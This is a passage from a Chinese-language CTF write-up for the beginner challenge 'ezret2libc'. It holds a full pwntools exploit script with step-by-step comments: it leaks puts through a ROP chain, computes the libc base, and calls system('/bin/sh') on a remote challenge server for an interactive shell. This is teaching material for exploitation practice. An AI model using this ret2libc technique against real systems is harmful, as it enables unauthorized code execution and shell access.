        <h2 id="ezret2libc"   >
          <a href="#ezret2libc" class="heading-link"><i class="fas fa-link"></i></a><a href="#ezret2libc" class="headerlink" title="ezret2libc"></a>ezret2libc</h2>
      <p>经典ret2libc模板题，泄露put基地址算其他函数地址（system（）和”/bin/sh”），由于是新生赛，脚本中会给出重要步骤的注释。<br>exp：</p>
<figure class="highlight py"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./ret2libc&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28691</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2libc&quot;</span>)</span><br><span class="line">rop = ROP(<span class="string">&quot;./ret2libc&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">padding = <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x00000401218</span></span><br><span class="line">pop_ret = <span class="number">0x000040101a</span> </span><br><span class="line">pop_rdi_ret = <span class="number">0x0004012b3</span></span><br><span class="line"><span class="comment">#利用ROPgadget工具找gadget，后续解释gadget用途</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line"><span class="comment">#puts的plt表可相当于调用puts函数</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line"><span class="comment">#puts的全局偏移地址</span></span><br><span class="line"><span class="comment">#start_addr = elf.symbols[&#x27;_start&#x27;] </span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>* <span class="number">0x10</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)  + p64(main_addr)</span><br><span class="line"><span class="comment">#pop_rdi_ret功能：1）为rdi赋值，赋值内容为puts的puts_got(全局偏移地址)，为puts函数调用做准备。2）ret到下一个函数</span></span><br><span class="line"><span class="comment">#main_addr为程序main主函数的地址</span></span><br><span class="line"><span class="comment">#payload实现的功能是将puts的got表打印出来,再跳转回main函数</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;input:\n&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#接收puts_addr,全局偏移地址为 &quot;\x7f??????&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr:&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment">#将puts的全局偏移地址减去在libc库中的相对偏移地址得到的为libc基地址，见图1.1</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"><span class="comment">#将libc基地址与libc库中system()相对偏移地址相加得到system（）全局偏移地址</span></span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>)) </span><br><span class="line"><span class="comment">#同理得到&quot;/bin/sh&quot;全局偏移地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base:&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system_addr:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;bin_sh_addr:&#x27;</span>,<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>* <span class="number">0x10</span> +p64(pop_ret)+ p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line"><span class="comment">#pop_ret用于栈对齐，ubuntu18以上版本需要栈对齐，具体理论自行搜索</span></span><br><span class="line"><span class="comment">#这里的pop_rdi_ret和payload1功能相同</span></span><br><span class="line"><span class="comment">#payload2实现的功能是将&quot;/bin/sh&quot;写入rdi并调用system()函数执行</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#io.recvuntil(&#x27;input:\n&#x27;)</span></span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
